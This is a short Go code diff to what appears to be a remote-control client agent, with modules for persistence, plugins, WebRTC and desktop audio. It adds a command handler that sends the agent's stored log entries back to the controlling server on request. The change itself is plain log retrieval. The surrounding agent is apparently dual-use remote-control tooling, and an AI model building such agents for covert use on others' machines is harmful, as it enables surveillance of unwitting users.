@@ -23,6 +23,7 @@ import (
 	"overlord-client/cmd/agent/persistence"
 	"overlord-client/cmd/agent/plugins"
 	"overlord-client/cmd/agent/runtime"
+	"overlord-client/cmd/agent/securelog"
 	"overlord-client/cmd/agent/sysinfo"
 	"overlord-client/cmd/agent/webrtcpub"
 	"overlord-client/cmd/agent/wire"
@@ -2023,6 +2024,31 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		caps := audio.ProbeCapabilities()
 		payload, _ := json.Marshal(caps)
 		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: caps.Available, Message: string(payload)})
+	case "client_logs_request":
+		payload := payloadAsMap(envelope["payload"])
+		sinceSeq := uint64(payloadNumberToInt64(payload["sinceSeq"]))
+		limit := int(payloadNumberToInt64(payload["limit"]))
+		snap := securelog.SnapshotLogs(sinceSeq, limit)
+		entries := make([]wire.ClientLogEntry, 0, len(snap.Entries))
+		for _, entry := range snap.Entries {
+			entries = append(entries, wire.ClientLogEntry{
+				Seq:    entry.Seq,
+				At:     entry.At,
+				Source: entry.Source,
+				Blob:   entry.Blob,
+			})
+		}
+		return wire.WriteMsg(ctx, env.Conn, wire.ClientLogsResult{
+			Type:      "client_logs_result",
+			CommandID: cmdID,
+			OK:        snap.Enabled && snap.Error == "",
+			Entries:   entries,
+			Dropped:   snap.Dropped,
+			FromSeq:   snap.FromSeq,
+			ToSeq:     snap.ToSeq,
+			Enabled:   snap.Enabled,
+			Error:     snap.Error,
+		})
 	case "desktop_audio_start":
 		sessionID, _ := envelopePayloadString(envelope, "sessionId")
 		source := "system"
